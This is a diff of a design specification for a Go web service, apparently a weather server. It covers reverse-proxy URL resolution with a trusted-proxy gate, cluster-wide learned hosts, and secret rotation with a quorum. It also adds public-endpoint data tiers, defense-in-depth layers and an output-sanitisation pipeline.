-**URL Format:** `{proto}://wthr.top/path` or `{proto}://wthr.top:{port}/path`
+**URL Format:** `{proto}://{fqdn}/path` or `{proto}://{fqdn}:{port}/path`
 
 **Port Stripping :**
 - `:80` and `:443` are NEVER included in URLs
@@ -12319,9 +12772,9 @@ All templates, Swagger/OpenAPI, GraphQL, email links, etc. MUST use these resolv
 
 ### Resolution Order (Reverse Proxy Preferred)
 
-**We prefer to run behind a reverse proxy. Reverse proxy headers take priority.**
+**We prefer to run behind a reverse proxy. Reverse proxy headers take priority — but ONLY when the immediate peer is in `server.trusted_proxies` (PART 12 → "Trusted Proxies"). Headers from non-trusted peers are stripped before resolution, falling the chain through to `DOMAIN` env / hostname / public IP. This is the security gate that prevents a public-facing direct deployment from being tricked into trusting a forged `X-Forwarded-Host`.**
 
-**`wthr.top` Resolution:**
+**`{fqdn}` Resolution:**
 
 | Priority | Source | Description |
 |----------|--------|-------------|
@@ -12338,7 +12791,7 @@ All templates, Swagger/OpenAPI, GraphQL, email links, etc. MUST use these resolv
 - IPv4 excludes: `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`, `169.254.0.0/16`, `127.0.0.0/8`
 - IPv6 excludes: `::1`, `fe80::/10` (link-local), `fc00::/7` (unique local)
 
-**DOMAIN Environment Variable (Comma-Separated List):**
+### DOMAIN Environment Variable (Comma-Separated List)
 
 ```bash
 # Single domain
@@ -12350,10 +12803,10 @@ DOMAIN=myapp.com,www.myapp.com,api.myapp.com
 
 | Behavior | Description |
 |----------|-------------|
-| First domain is primary | Used as `wthr.top` and `GetBaseDomain()` |
+| First domain is primary | Used as `{fqdn}` and `GetBaseDomain()` |
 | Auto-infer wildcard | Same base domain → `*.myapp.com` |
 | Skip learning | If DOMAIN set, no need to learn from requests |
-| CORS auto-configured | All listed domains added to allowed origins |
+| CORS auto-configured | DOMAIN entries become priority-2 in the CORS allow-list resolution order — see PART 16 → "CORS Allow-list Resolution Order". Explicit `web.cors` (priority 1) overrides. |
 | Validate on startup | Invalid domains cause startup warning |
 
 **Examples:**
@@ -12394,16 +12847,16 @@ DOMAIN=myapp.com
 
 | Header | Provides |
 |--------|----------|
-| `X-Forwarded-Host` | `wthr.top` |
+| `X-Forwarded-Host` | `{fqdn}` |
 | `X-Forwarded-Proto` | `{proto}` |
 | `X-Forwarded-Port` | `{port}` |
-| `X-Forwarded-Prefix` | `/` |
+| `X-Forwarded-Prefix` | `{base_url}` |
 | `X-Forwarded-Ssl` | `{proto}` (on=https) |
-| `X-Real-Host` | `wthr.top` (fallback) |
-| `X-Original-Host` | `wthr.top` (fallback) |
+| `X-Real-Host` | `{fqdn}` (fallback) |
+| `X-Original-Host` | `{fqdn}` (fallback) |
 | `X-Url-Scheme` | `{proto}` (fallback) |
-| `X-Forwarded-Path` | `/` (fallback) |
-| `X-Script-Name` | `/` (fallback) |
+| `X-Forwarded-Path` | `{base_url}` (fallback) |
+| `X-Script-Name` | `{base_url}` (fallback) |
 | `X-Forwarded-For` | Request IP (for logging) |
 | `X-Real-IP` | Request IP (fallback) |
 
@@ -12414,9 +12867,29 @@ DOMAIN=myapp.com
 When reverse proxy headers are detected, the app:
 1. **Live reloads** URL variables immediately (no restart required)
 2. **Infers wildcard domains** from observed patterns
-3. **Updates cached values** for Swagger/GraphQL/templates
+3. **Updates cached values** used by every outbound URL — Swagger/GraphQL/HTML templates, **email content (verification, password reset, notifications, alerts, invites)**, **OAuth callbacks**, **webhook delivery**, **push notification deep links**, **API HATEOAS links**, **CSP / CORS allow-lists**, and any other place the app emits a URL.
 
-**Domain Learning Algorithm:**
+**Auto-config propagation rule:** once the app has observed a reverse-proxy header (or `DOMAIN` env var, or any other source higher in the resolution order), every URL the app **emits or displays anywhere** uses the learned `{proto}`, `{fqdn}`, and `{port}` (with `:80`/`:443` stripped). This is exhaustive — there are no exceptions:
+
+| Where URLs appear | Use learned values |
+|-------------------|--------------------|
+| **Outbound** — request responses, redirects, HATEOAS links, OAuth callbacks, webhooks, push notification deep links | ✓ |
+| **Email / notifications** — verification, password reset, alerts, invites, security notifications | ✓ |
+| **Documentation surfaces** — Swagger/OpenAPI `servers[]`, GraphQL schema URL, GraphiQL endpoint, embedded API docs | ✓ |
+| **Browser-rendered pages** — HTML templates, no-JS templates, share links, canonical URLs, `<link rel="canonical">`, sitemap.xml entries | ✓ |
+| **CLI / TUI output** — startup banner, `--version` with URL, status command, "service started at..." messages, error pages that print "see https://..." | ✓ |
+| **Logs** — any log line that includes a URL (request log, audit log, security log) — log the external URL alongside the internal bind address, never the internal address alone | ✓ |
+| **Headers** — CSP `connect-src`, CORS allow-lists, `Link:`, `Location:`, `Content-Location:`, OAuth `WWW-Authenticate` | ✓ |
+| **Static manifests** — `manifest.json` `start_url`/`scope`, `robots.txt` `Sitemap:` line, `.well-known/*` documents | ✓ |
+| **Operator-visible config** — `--print-config`, admin panel "Server URL" field, autodiscover response | ✓ |
+
+**Why exhaustive:** there is no value to the operator or the user in seeing `http://localhost:64580` anywhere when the real external URL is `https://mydomain.org`. The internal bind address is a diagnostic detail; the external URL is the truth. The only place the internal `:port` should appear is the very-low-level bind log (`bind: 0.0.0.0:64580 ok`) — and even that should be paired with a "externally accessible at: https://mydomain.org" line as soon as a request observation confirms it.
+
+Operators do NOT have to configure email base URL, OAuth callback, webhook URL, banner display URL, sitemap URL, etc. separately — the binary derives them all from the same learned values.
+
+**No-request-context case:** background tasks and the scheduler do not have a live `*http.Request`. They use the **most recently observed** values from the domain-learning history (or, if nothing has been observed yet, fall back to the static resolution chain — `DOMAIN` env → `os.Hostname()` → public IP → `localhost`). Once a real request is observed, the learned values take over and stay sticky across restarts (persisted to config — same persistence rule as `{port}`).
+
+### Domain Learning Algorithm
 
 ```
 Observation History:
@@ -12435,7 +12908,7 @@ Inference:
 
 | Scenario | Detection | Result |
 |----------|-----------|--------|
-| Same domain repeated | Stable | Use as `wthr.top` |
+| Same domain repeated | Stable | Use as `{fqdn}` |
 | www + apex seen | Wildcard | Infer `*.domain.com`, use apex as primary |
 | Multiple subdomains | Wildcard | Infer `*.domain.com`, use most common |
 | Conflicting domains | Warning | Log warning, use most recent |
@@ -12449,6 +12922,17 @@ Inference:
 | Domain change detected | Reload, log change |
 | Proto change (http→https) | Reload, log upgrade |
 | Conflicting headers | Log warning, use priority order |
+
+**Cluster Sync of Learned Hosts:**
+
+In a multi-node deployment each replica only sees the requests routed to it, but every node must agree on the learned-hosts list (otherwise CORS / CSP `connect-src` / banner URL would diverge per node). The learned-hosts set is therefore a **shared cluster state**, not per-node memory:
+
+| Storage | `app_secrets`-adjacent table `learned_origins` (name, scheme, observed_at, observation_count). NOT in `app_secrets` itself — it's not secret. |
+| Update path | Every node, on observing a new `X-Forwarded-Host` / `X-Real-Host` / `X-Original-Host` value, runs an UPSERT keyed on `(scheme, host)` — `observation_count = observation_count + 1`, `observed_at = now()`. The UPSERT is a single SQL statement so it's atomic across replicas without explicit locking. |
+| Propagation | Each node polls the table every 30 seconds (or subscribes via Postgres LISTEN / Valkey pub-sub if a cache is configured); when its in-memory cache differs from the table, it reloads URL vars and emits `config.learned_hosts_reloaded` to `server.log`. |
+| Trust gate | Only requests from `trusted_proxies` peers (PART 12 → "Trusted Proxies") count toward observations — same gate that guards the Resolution Order. An attacker reaching the binary directly cannot poison the cluster-wide list. |
+| Eviction | Hosts with `observation_count < 3` AND `observed_at` older than 30 days are pruned by the scheduler. Hosts in `DOMAIN` env or `web.cors` config are NEVER evicted (config sources outrank learned). |
+| Single-node deployments | Same table, but no polling overhead — local writes are immediate reads. |
 
 **Configuration:**
 
@@ -12507,7 +12991,7 @@ func GetWildcardDomain() string
 |-----------|-----------------|
 | HTML templates | `BuildURL(r, "/path")` |
 | Swagger/OpenAPI | `servers[0].url` = `BuildURL(r, "")` |
-| GraphQL | `BuildURL(r, "/graphql")` |
+| GraphQL | `BuildURL(r, "/api/graphql")` (or `/api/{api_version}/graphql` for a specific version) |
 | Email links | `BuildURL(r, "/verify")` |
 | CORS origins | Auto-include `GetWildcardDomain()` if detected |
 | OAuth callbacks | `BuildURL(r, "/auth/callback")` |
@@ -12694,7 +13178,7 @@ func IsValidSSLHost(host string) bool {
 - `X-Url-Scheme` - Alternative: "https" or "http"
 - `Front-End-Https` - Microsoft: "on" = https
 
-**FQDN Detection (`wthr.top`):**
+**FQDN Detection (`{fqdn}`):**
 - `X-Forwarded-Host` - Standard: "example.com" or "example.com:8080"
 - `X-Real-Host` - nginx: "example.com"
 - `X-Original-Host` - Alternative
@@ -12729,8 +13213,8 @@ func IsValidSSLHost(host string) bool {
 
 | Rule | Description |
 |------|-------------|
-| **Format** | UUID v4 (e.g., `550e8400-e29b-41d4-a716-446655440000`) |
-| **Generation** | Use secure random UUID generator |
+| **Format** | RFC 9562 UUIDs. Use **v7** (Unix-time-ordered, monotonic) for any DB primary key or auditable identifier where insertion order matters; use **v4** (purely random) for opaque tokens (request IDs, request-scoped IDs, idempotency keys) where order is irrelevant. RFC 9562 supersedes RFC 4122. |
+| **Generation** | Use a cryptographically secure source (`crypto/rand`). Library: `github.com/google/uuid` for v4, `github.com/google/uuid` (≥ v1.6) or `github.com/gofrs/uuid` for v7. |
 | **Propagation** | Include in all outgoing requests to downstream services |
 | **Response** | Return `X-Request-ID` in response headers |
 | **Logging** | Include `{request_id}` in all log entries for the request |
@@ -12798,8 +13282,8 @@ func RequestIDMiddleware(next http.Handler) http.Handler {
 
 ### Implementation Requirements
 
-1. **Request Context Helper**: Create a helper function that extracts `{proto}`, `wthr.top`, `{port}` from each request
-2. **URL Builder**: Create a helper that builds full URLs: `{proto}://wthr.top:{port}/path` (strip :80/:443)
+1. **Request Context Helper**: Create a helper function that extracts `{proto}`, `{fqdn}`, `{port}` from each request
+2. **URL Builder**: Create a helper that builds full URLs: `{proto}://{fqdn}:{port}/path` (strip :80/:443)
 3. **Never Import** hardcoded URLs into templates - always pass detected values
 4. **API Response URLs**: All URLs in API responses must be absolute, using detected values
 5. **Swagger/OpenAPI**: Server URL must be detected, not hardcoded
@@ -12954,7 +13438,7 @@ func logError(ctx context.Context, err *AppError) {
   "request_id": "req_abc123",
   "http_status": 500,
   "internal": "pq: connection refused",
-  "path": "/api/v1/users",
+  "path": "/api/{api_version}/users",
   "method": "GET",
   "ip": "192.168.1.100"
 }
@@ -13097,16 +13581,23 @@ func GetUserWithVersion(ctx context.Context, userID int, version int) (*User, er
 }
 ```
 
-### HTTP Cache Headers
+### HTTP Cache Headers (RFC 9111)
 
 | Content Type | Cache-Control Header | Description |
 |--------------|---------------------|-------------|
-| Static assets (JS/CSS/images) | `public, max-age=31536000, immutable` | 1 year, fingerprinted files |
-| HTML pages | `no-store` | Always fetch fresh |
+| Static assets (JS/CSS/images, fingerprinted) | `public, max-age=31536000, immutable` | 1 year |
+| Static assets (non-fingerprinted, e.g., favicon.ico) | `public, max-age=86400` | 1 day |
+| HTML pages (public) | `public, max-age=60, must-revalidate` | Short freshness with revalidation |
+| HTML pages (authenticated) | `private, no-store` | Never cache user-specific pages |
 | API responses (public) | `public, max-age=60` | Short cache for CDN |
 | API responses (private) | `private, no-store` | User-specific data |
+| API responses (sensitive — auth, tokens, secrets) | `no-store, no-cache, must-revalidate, max-age=0` + `Pragma: no-cache` | Defense in depth — bypass legacy HTTP/1.0 caches and refuse-to-cache hints |
 | Authenticated pages | `private, no-store` | Never cache |
 | Error pages | `no-store` | Don't cache errors |
+| `/.well-known/security.txt`, `/.well-known/pgp-key.asc` | `public, max-age=86400` | Daily refresh — security contact info should propagate quickly |
+| `/healthz` (public) | `no-store` | Health is real-time |
+| Reports endpoints (`/api/{api_version}/server/reports/*`) | `no-store` | Append-only sinks; nothing to cache |
+| Content-negotiated responses (Accept-driven) | Add `Vary: Accept, Accept-Encoding, Accept-Language` alongside Cache-Control | Prevents caches keyed on URL alone from returning the wrong representation |
 
 ```go
 func setCacheHeaders(w http.ResponseWriter, contentType string, isAuthenticated bool) {
@@ -13359,6 +13850,17 @@ if err != nil && !isColumnExistsError(err) {
 - All nodes share same database and cache
 - Config changes propagate automatically
 
+**Cluster join + secret distribution:** new nodes join via the flow defined in **PART 34 → "Join Cluster Flow (Technical)"**. The bootstrap response from the existing node carries every `app_secrets` row (PART 11 → "Cryptographic Keys") inside the encrypted payload — `installation_secret`, `cookie_signing_key`, `csrf_token_secret` are NOT regenerated per node. The pre-existing `server.security.encryption_key` (`server.yml`) is also distributed in the same encrypted payload. All replicas share one set.
+
+**Cluster nodes vs agents (do NOT confuse):**
+
+| Term | What it is | Where it runs | Auth |
+|------|-----------|----------------|------|
+| **Cluster node** | Another instance of THIS server binary, sharing the same DB and cache, behind the same admin namespace | Anywhere reachable from the primary node | Internal — joins via the cluster join token; subsequent traffic uses the shared DB |
+| **Agent** (PART 33) | A separate, purpose-built `weather-agent` binary on a remote machine reporting INTO the server | Customer / operator machines (web hosts, build runners, monitored machines) | Bearer token (`adm_agt_` / `usr_agt_` / `org_agt_`) — see PART 14 → Token Types |
+
+Agents are NEVER cluster nodes; they don't share the DB; they don't get `app_secrets` distributed to them. Cluster nodes are NEVER agents; they don't register via `/agents/register`.
+
 ### Cluster Heartbeat & Failure Handling
 
 **Every cluster node sends heartbeats to detect failures.**
@@ -13398,8 +13900,52 @@ If now - last_seen > 5 minutes:
          │
          ▼
 Admin manually removes dead nodes via:
-   /admin/server/cluster → Remove Node
+   /{admin_path}/server/cluster → Remove Node
 ```
+
+**Heartbeat Payload (every 30s, written to `nodes` table):**
+
+| Field | Description |
+|-------|-------------|
+| `node_id` | Hostname or operator-assigned ID |
+| `app_version` | Running binary's version (Tier-2 public-safe per PART 11) |
+| `commit_hash` | Build commit |
+| `installation_secret_version` | The version number of the `installation_secret` row this node currently has loaded (matches `app_secrets.version` for the `installation_secret` name). Used to detect drift. |
+| `server_security_encryption_key_version` | Same idea for the at-rest AES key (`server.security.encryption_key`). |
+| `cookie_signing_key_version` | Same. |
+| `csrf_token_secret_version` | Same. |
+| `learned_origins_version` | Latest `MAX(observed_at)` from the `learned_origins` table this node has read. |
+| `last_seen` | Heartbeat timestamp (server-side, on insert) |
+
+**Secret-version mismatch handling:** if a node's heartbeat reports a `*_version` lower than the cluster's current version (read from `app_secrets`), the primary logs `cluster.secret_version_drift` (which node, which secret, version delta) and the lagging node forces a re-read from the table on its next tick. If the drift exceeds 7 days (the `installation_secret` rotation grace window), the lagging node is marked **`stale`** instead of `healthy` and excluded from cluster ops until it catches up — preventing it from validating in-flight HMACs against an old key.
+
+### Secret Rotation in a Cluster (Anti-Split-Brain)
+
+**Rotating any `app_secrets` row across multiple nodes during a network partition could produce two "current" values. The rotation flow uses an advisory lock + quorum to prevent this.**
+
+| Step | Action |
+|------|--------|
+| 1 | The admin (or scheduler, for auto-rotated keys) calls `INSERT ... ON CONFLICT` on `app_secrets` with the next monotonic `version`, wrapped in an advisory lock keyed on `('rotate', name)`. PostgreSQL: `pg_try_advisory_xact_lock`; SQLite: a `BEGIN IMMEDIATE` transaction with a sentinel row in `cluster_locks`. |
+| 2 | Inside the lock, the node verifies it can reach **majority of healthy nodes** (per the latest heartbeat read; cached up to 30s). Fewer than majority → rotation **aborts** with `cluster.rotation_aborted_no_quorum`. The advisory lock releases without a row inserted. |
+| 3 | If quorum holds, the new row is inserted, the previous version's `expires_at` is set to `now + grace_window`, and the lock releases. |
+| 4 | All other nodes pick up the new version on their next 30s poll (or via Postgres `LISTEN` / Valkey pub-sub if enabled). They store both versions until the previous one's `expires_at` passes. |
+| 5 | If a partition is detected after step 3 (the rotating node is suddenly unable to confirm majority), the rotation is NOT rolled back — the version is in the DB, all nodes that can read the DB will converge. The minority side will mark itself `stale` (per heartbeat handling above) until reconnected. |
+
+**Why this prevents split-brain:** rotations only succeed if the rotating node has at least majority of healthy nodes available at the moment of rotation. Two halves of a partitioned cluster cannot both hit majority simultaneously. Even if a partition forms after rotation, the DB is the source of truth and the minority side knows it's stale.
+
+**Single-node "cluster" (most deployments):** quorum is trivially 1; the lock is still acquired but the majority check passes immediately. No special path.
+
+### Removed-Node Local Cleanup
+
+**When a node is manually removed via `/{admin_path}/server/cluster → Remove Node`, the database record is deleted, but the node's local on-disk state may still contain valid copies of `app_secrets` (it had them while it was in the cluster). The removal flow MUST handle both sides:**
+
+| Side | Action |
+|------|--------|
+| **Server-side** (from the removing node) | Delete the row from `nodes` table. Mark `app_secrets` versions valid for that node as `revoked_for_node = node_id` so audit can see the removal happened mid-rotation if applicable. Emit `cluster.node_removed` audit event. |
+| **Removed-node-side** (when the removed node next attempts to heartbeat) | Heartbeat returns `403 NODE_REMOVED`. The binary on the removed node MUST: (1) wipe `{config_dir}/security/pgp.priv.asc.enc` if present (PGP keys are cluster-shared and the removed node has lost permission to participate); (2) wipe its `app_secrets` cache; (3) leave `server.yml` minus the cluster section; (4) log `cluster.removed_self_cleanup` to local `audit.log`; (5) refuse to serve requests until re-joined. The binary does NOT delete logs, data files, or user content — those stay on the removed host for forensic / audit purposes. |
+| **If the removed node is offline at removal time** | The cleanup happens whenever the removed node next attempts to communicate. Until then, it's running with stale secrets — but per the secret-version-mismatch flow above, its requests would already fail because `installation_secret` may have rotated. Operators removing a node SHOULD power down or `systemctl stop {internal_name}` first, then remove. The admin panel surfaces this guidance. |
+
+**Caveat:** removed-node cleanup is best-effort. A truly compromised host that's been removed cannot be trusted to wipe its own secrets — assume the secrets it had ARE in attacker hands. Always rotate `installation_secret`, `cookie_signing_key`, `csrf_token_secret`, `server.security.encryption_key`, and the project PGP keypair after removing a compromised node. The admin panel offers a "Rotate everything" button on the Remove Node confirmation dialog.
 
 **Primary Election:**
 
@@ -13732,6 +14278,194 @@ func isSerializationError(err error) bool {
 
 # PART 11: SECURITY & LOGGING 
 
+## Public Endpoint Safety Principle (Security First)
+
+**This is the hard rule that governs every public (no-auth) surface in the application — APIs, frontend pages, reports endpoints, RSS feeds, sitemaps, anything. If it can be loaded by anyone in the world, it MUST be safe for anyone in the world to see.**
+
+### What Safe for Anyone to See Means
+
+**Three tiers — by risk, not by feel. Operational info that helps users / admins / security researchers diagnose the app is fine to expose. Only true secrets and attacker-useful enumeration vectors are hard-restricted.**
+
+#### Tier 1 — NEVER shown publicly (not even in debug mode)
+
+**These are true secrets or directly user-correlated. Production AND debug responses both omit them.**
+
+| Item | Reason |
+|------|--------|
+| Database credentials (password, full DSN, connection string) | Direct credential exposure. |
+| Specific internal IPs / hostnames (`db.internal.lan`, `10.0.0.5`, `192.168.1.5`) | Network topology + lateral-movement aid. |
+| API tokens, session tokens, CSRF tokens of any user | Direct credential exposure. |
+| Recovery keys, MFA secrets, passkey private material | Direct credential exposure. |
+| Other users' email addresses, real names, phone numbers | PII / GDPR. The user's own profile follows `privacy.profile_*_public` config. |
+| Other users' session activity, IP, last-seen | PII / privacy. |
+| Filesystem paths from build output, log paths, config paths | Source-tree disclosure. |
+| Account-existence signals — "username vs password" / "user found vs not" / signup with existing email | Enumeration. |
+| Specific rate-limit thresholds (return generic 429, not "limit X reached") | Helps attacker tune their pace. |
+| Per-user resource counts when not the user's own resources | Enumeration. |
+| Any field tagged `private`, `internal`, or `sensitive` in the data model | Explicit author intent. |
+
+#### Tier 2 — Public-safe operational info (always shown, even unauthenticated)
+
+**These are useful for users, security researchers filing reports, monitoring dashboards, and uptime checks. None of them help an attacker enumerate or escalate.**
+
+| Item | Where it appears | Why public-safe |
+|------|------------------|-----------------|
+| `app_name`, `project_name` | `/healthz`, banners, headers | Already in URL / branding |
+| `version` (semver) | `/healthz`, `Server:` header, `--version` | Required so security researchers can correlate reports against releases |
+| `commit_hash` | `/healthz`, `--version` | Public — embedded at build, anyone can extract from binary |
+| `build_date` | `/healthz`, `--version` | Same as above |
+| `go_version` | `/healthz` (under `runtime`) | Build metadata, not a vulnerability vector on its own |
+| `uptime` (seconds or human) | `/healthz` | Operational diagnostic |
+| `mode` (`production` / `development`) | `/healthz` | Operational diagnostic; debug is gated separately |
+| `db_type` (`sqlite` / `postgres` / `valkey` / etc.) | `/healthz` | Just the engine family — no host, no creds |
+| `db_locality` (`local` / `remote`) | `/healthz` | Fuzzy — no host name or IP |
+| `cluster_size`, `is_leader`, `is_follower` | `/healthz` | Cluster state, no addresses |
+| `request_count_24h`, `active_connections`, `total_connections` | `/healthz` (under `metrics`) | Operational, aggregate |
+| `unique_visitors_24h`, `peak_concurrent` | `/healthz` (aggregate only) | Bragging rights / monitoring; no per-IP detail |
+| Public domain(s) the app serves (`{fqdn}`, learned reverse-proxy hosts) | `/api/autodiscover`, banners | Already public — that's how visitors got here |
+| Tor `.onion` / I2P address (if Tor/I2P enabled and `expose: true`) | `/api/autodiscover` | Operator opt-in; advertised on purpose |
+| OpenAPI spec, GraphQL schema | `/api/openapi.json`, `/server/docs/*` | API surface is intentionally public |
+| Public OG / social metadata | HTML `<meta>` | Required for sharing / SEO |
+
+**Rule:** if a researcher would need it to file a useful CVE report, it should be in Tier 2. The version, commit, and mode triple is the minimum set.
+
+#### Tier 3 — Debug-only (shown when `--debug` / `DEBUG=true`)
+
+**These are detailed diagnostics that help developers and operators figure out *why* something failed. They are gated behind explicit debug mode — production deployments do not expose them by default. Debug mode is meant to run inside a container or sandbox during testing, so accidental leakage is mitigated by network isolation, not by hoping operators read this rule.**
+
+| Item | Source | Why debug-gated |
+|------|--------|-----------------|
+| Stack traces in error responses | Panic recovery, `slog.Error` chains | Reveals source structure |
+| Full Go error chain (`fmt.Errorf("%w", ...)` unwrapped) | Application errors | Reveals internal flow |
+| **CSP violation context — directive matched, blocked-uri, source-file, line, sample, why this directive applied** | CSP middleware | Browser already shows this in devtools; mirrors it in server response for non-browser test runners |
+| **CSRF failure context — which check tripped (origin mismatch / token mismatch / token absent / SameSite blocked), expected vs got Origin** | CSRF middleware | Lets developers see *why* the form posted by their integration test got rejected |
+| **CORS rejection context — request Origin, computed allow-list, which resolution-order tier produced the list, why credentials path mismatched** | CORS middleware | Same — explains why a fetch was blocked |
+| **Validation failure detail — which field, which rule, what the input looked like (sensitive fields redacted)** | Input validators | Beyond the canonical `details` block — full constraint info |
+| Rate-limit details — current count, window, threshold, time to reset | Rate limiter | Operator running load tests against their own dev instance |
+| Specific 4xx error reason — "user not found" vs "wrong password" (auth flows only when in debug) | Auth handlers | Lets devs reproduce a flaky login locally |
+| SQL query (parameterized, parameters redacted) and EXPLAIN output | DB layer | Performance / bug hunting |
+| Cache hit/miss/eviction patterns | Cache layer | Tuning |
+| Internal IP / hostname of upstream services in error messages | Network layer | Diagnosing routing issues |
+| Goroutine dump, pprof profiles, expvar | `/api/{api_version}/debug/*` (PART 6) | Already debug-gated; reaffirmed |
+| Setup token reminder (after first install, periodically until used) | Startup banner | Helps the operator who lost the email |
+
+**Debug mode response shape:**
+
+When `DEBUG=true` is active and an error occurs, the canonical error body (PART 16 → "Error Response") gets an additional `_debug` field:
+
+```json
+{
+  "ok": false,
+  "error": "CSP_VIOLATION",
+  "message": "Inline script blocked",
+  "details": { "directive": "script-src" },
+  "_debug": {
+    "blocked_uri": "inline",
+    "source_file": "/static/js/app.js",
+    "line": 42,
+    "column": 7,
+    "sample": "doSomething(",
+    "matched_policy": "script-src 'self' 'unsafe-inline'",
+    "why_blocked": "inline event handler — 'unsafe-inline' applies only to <script> blocks, not on=\"...\" attributes",
+    "fix_hint": "move the handler to an addEventListener() call in app.js"
+  }
+}
+```
+
+**Production strips `_debug` everywhere — it is wrapped in a single middleware that drops the field by tag (`json:"_debug,omitempty"` + `dev_only:"true"` per the Output Sanitization Pipeline above). Debug must NEVER be on in a public deployment, but the strip is the second layer.**
+
+**Standing rule:** if a piece of information helps a researcher / monitor / debugger and doesn't belong in Tier 1, it goes in Tier 2 (always public) or Tier 3 (debug-only). When unsure between Tier 2 and Tier 3, default to Tier 3 — the operator can promote later. When unsure between Tier 1 and Tier 3, default to Tier 1 — debug mode is not a license to leak secrets.
+
+### Defense-in-Depth Layers
+
+**Security is hard. The codebase MUST defend in layers so a single missed check doesn't cascade into a breach. Each layer below is mandatory — none can be skipped because "the layer above will catch it."**
+
+| Threat | Layer 1 (input) | Layer 2 (data access) | Layer 3 (output) | Layer 4 (transport) |
+|--------|-----------------|------------------------|-------------------|----------------------|
+| SQL injection | Strict input validation by type/format | Parameterized queries ONLY — never `fmt.Sprintf` SQL with user input | ORM/query-builder layer rejects suspicious patterns | Database user has minimum privileges (no DROP, no DDL in app role) |
+| XSS | Reject control chars / null bytes at input | n/a | HTML-escape on render (templates auto-escape; raw output requires explicit `template.HTML` cast and review) | CSP `'self' + 'unsafe-inline'` blocks cross-origin script loads (PART 11 → CSP) |
+| Enumeration (account existence, valid IDs, valid tokens) | Rate limit per IP + per identifier + global | Constant-time comparison for tokens / passwords | Identical response shape and timing for "not found" vs "no access" | n/a |
+| Timing oracles | n/a | `subtle.ConstantTimeCompare` for all secret comparisons | Identical response time for success/fail by adding artificial sleep when faster than threshold | n/a |
+| Credential stuffing | Rate limit per IP + per username + global | Argon2id on every login attempt (no "fast path" for unknown users) | Generic "invalid credentials" message | Account lockout after N failures |
+| Path traversal | Validate paths, reject `..` / null bytes | `filepath.Clean()` + base-dir confinement | n/a | OS-level read perms restrict reachable files |
+| Token / credential leakage | n/a | Never `slog.Info("token=", t)` — log token ID hash only | Sanitization layer strips known sensitive query params from URL fields in reports / logs / error contexts (see PART 14 → "Public Reports Scope") | TLS in transit (PART 15) |
+| CSRF | Validate Origin + same-origin check | n/a | CSRF token on cookie-authenticated state-changing requests (PART 16 → CSRF) | `SameSite=Strict` cookies (browser-level enforcement) |
+
+**Rule:** when implementing a feature, walk every layer. Don't assume "the input validator caught it" or "the output template will escape it" — write the code as if every other layer is broken.
+
+### Output Sanitization Pipeline
+
+**Every public response passes through a sanitization pipeline before it leaves the server. The pipeline is a single chokepoint — features cannot opt out, only add additional filters.**
+
+| Stage | Action |
+|-------|--------|
+| 1. Allow-list fields | Marshal only fields explicitly tagged for the response shape. Drop any field not in the allow-list. (Defense against accidentally adding a sensitive field to a struct returned by a public handler.) |
+| 2. Redact known-sensitive query params | URL fields in the response body (and logged URLs): drop or hash query params named `token`, `session`, `code`, `key`, `password`, `secret`, `auth`, `pwd`, `api_key`, `apikey`, `access_token`, `refresh_token`. Match case-insensitive. |
+| 3. Strip internal IPs / paths | Regex-detect `10\.|172\.(1[6-9]\|2[0-9]\|3[01])\.|192\.168\.|127\.|169\.254\.` and filesystem paths in any string field; replace with `[redacted]`. |
+| 4. Truncate | Strings to 256 chars (URLs), 200 chars (messages, samples), 2KB (stacks). Long fields are a leakage and DOS risk. |
+| 5. Strip dev-only fields | In production mode, drop fields tagged `dev_only:"true"` (e.g., `_debug`, `_internal_id`). Dev mode keeps them for troubleshooting. |
+| 6. Constant-time finalize | For auth-sensitive paths (login, password reset, token validation), pad response time to a fixed minimum (e.g., 100ms) so success/fail timing doesn't differ. |
+
+### Operator UX — Security Without a Degree
+
+**Security is hard for users and operators too. The application MUST be secure by default with zero configuration. Operators should never need to read OWASP top-10 to ship a safe deployment.**
+
+| Default | Why |
+|---------|-----|
+| HTTPS preferred everywhere — `http://` upgrade on first visit | One config (cert) and TLS just works (PART 15 → Let's Encrypt) |
+| CSRF on by default with `SameSite=Strict` cookies | No knobs to flip. Bypasses for Bearer/public/exempt paths are automatic (PART 16 → CSRF) |
+| CSP on by default with sensible per-directive allow-list | "Just works" for typical apps; auto-detects own domain (PART 11 → CSP) |
+| CORS on by default, credential-aware | "Just works" for public APIs and authenticated apps (PART 16 → CORS) |
+| Rate limit on by default | Per-IP + per-identifier on auth endpoints; configurable but non-zero by default |
+| Argon2id for passwords | No bcrypt/MD5/SHA-* options — secure algorithm not negotiable |
+| Setup token shown ONCE on first start | No default admin credentials, ever |
+| `--debug` / `DEBUG=true` requires explicit opt-in | Debug endpoints disabled in production by default (PART 6) |
+| Errors return canonical generic messages | Stack traces only in `debug.log`, never in HTTP response (PART 5) |
+| Secret-in-config detection on startup | Warning logged if config contains hardcoded `password=`, `token=`, `secret=` — operator nudged toward env vars / vault |
+| `/healthz` returns operational status + Tier-2 public-safe info | Includes `version`, `commit_hash`, `build_date`, `uptime`, `db_type`, aggregate metrics. Excludes Tier-1 secrets (DSN, internal IPs, credentials). Tier-3 detail (deps versions, internal hosts) requires `--debug`/`DEBUG=true`. See "What Safe for Anyone to See Means" above. |
+
+**The contract:** an operator who runs the binary with the binary's defaults, sets a domain, and points DNS at it gets a deployment that passes a baseline security audit. No knobs to flip, no config to write. Tightening (nonces, stricter CORS, `csp.mode: enforce`, etc.) is opt-in for operators who want it.
+
+## Cryptographic Keys
+
+**The application maintains a small set of project-level cryptographic secrets. They are persisted in `server.db` (or where noted), included in every backup, and never logged.**
+
+### `installation_secret`
+
+The root secret all other derived material hangs off. Without it, in-flight HMACs cannot be validated and the PGP private key cannot be decrypted.
+
+| Property | Detail |
+|----------|--------|
+| Length | 32 bytes (256 bits) of `crypto/rand` |
+| Generated | First start, before the setup token is shown. Stored in `server.db` row `app_secrets.installation_secret`, base64-encoded. |
+| Scope | Cluster-wide. The first node generates it; subsequent nodes joining the cluster receive it via the secure cluster join protocol (PART 34 → "Join Cluster Flow (Technical)" — the join token is HMAC-derived and the `installation_secret` is delivered as part of the same handshake payload). NEVER appears in a request, response, log, or admin UI. |
+| Used by | `{security_id}` HMAC (PART 11 → "Security Reports"); PGP private-key KDF (PART 11 → "GPG Keypair Management"); future derived material (cluster-internal request signing, cookie signing salts). |
